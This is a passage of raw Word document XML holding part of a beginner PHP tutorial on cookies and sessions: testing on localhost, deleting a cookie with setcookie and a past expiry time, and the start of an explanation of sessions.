      <w:ins w:id="127" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>Testing our application.</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="128" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="129" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t xml:space="preserve">Let’s assume you have saved your PHP files in </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>phptus</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t xml:space="preserve"> folder.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="81"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="130" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="131" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>Step 1 – open your web browser and enter the URL </w:t>
        </w:r>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>http://localhost/phptuts/cookies.php</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:ins w:id="132" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00405338">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:noProof/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="30CF6D98" wp14:editId="20AC3A49">
            <wp:extent cx="5553075" cy="2294255"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="10" name="Picture 10" descr="PHP Cookies and PHP Session">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P Cookies and PHP Session">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2294255"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="133" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="134" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>Note: Only an empty array has been displayed</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="82"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="135" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="136" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>Step 2 – Browser to the URL </w:t>
        </w:r>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>http://localhost/phptuts/cookies.php</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:ins w:id="137" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00405338">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:noProof/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="14A5A141" wp14:editId="3127FB6D">
            <wp:extent cx="5553075" cy="2294255"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="9" name="Picture 9" descr="PHP Cookies and PHP Sessio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P Cookies and PHP Session">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3075" cy="2294255"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="83"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="138" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="139" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>Step 3 – Switch back to the first tab then click on refresh button</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:ins w:id="140" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00405338">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:noProof/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="64EEB028" wp14:editId="33E8C9A5">
            <wp:extent cx="5594350" cy="2826385"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="8" name="Picture 8" descr="PHP Cookies and PHP Sessio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Cookies and PHP Session">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4350" cy="2826385"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="141" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="142" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>Wait for a minute then click on refresh button again. What results did you get?</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="372" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="143" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="144" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>Delete Cookies</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="84"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="145" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="146" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>If you want to destroy a cookie before its expiry time, then you set the expiry time to a time that has already passed.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="84"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="147" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="148" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t xml:space="preserve">Create a new filed named </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>cookie_destroy.php</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t xml:space="preserve"> with the following code</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="300" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="149" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="150"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151"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152" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="153" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00206B25">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>setcookie</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00206B25">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>(</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00206B25">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>"</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00206B25">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>user_name</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00206B25">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>", "Guru99", time() - 360,'/');</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="300" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="154"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155" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="156" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>?&gt;</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="85"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="157" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="158" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>Repeat steps 1 through to 3 from the above section on retrieving cookie values.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="85"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="159" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="160" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>Open the URL </w:t>
        </w:r>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>http://localhost/phptuts/cookie_destroy.php</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="85"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="161" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="162" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>Switch to the URL </w:t>
        </w:r>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>http://localhost/phptuts/cookies_read.php</w:t>
        </w:r>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t> what results does it display?</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="372" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="163" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="164" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>What is a Session?</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00206B25" w:rsidRDefault="00B61B1D" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="86"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="165" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="lightGray"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="166" w:author="Unknown">
        <w:r w:rsidRPr="00206B25">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>A session is a global variable stored on the server.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00FA6CF1" w:rsidRDefault="00B61B1D" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="86"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="167" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="lightGray"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="168" w:author="Unknown">
        <w:r w:rsidRPr="00FA6CF1">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>Each session is assigned a unique id which is used to retrieve stored values.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00FA6CF1" w:rsidRDefault="00B61B1D" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="86"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
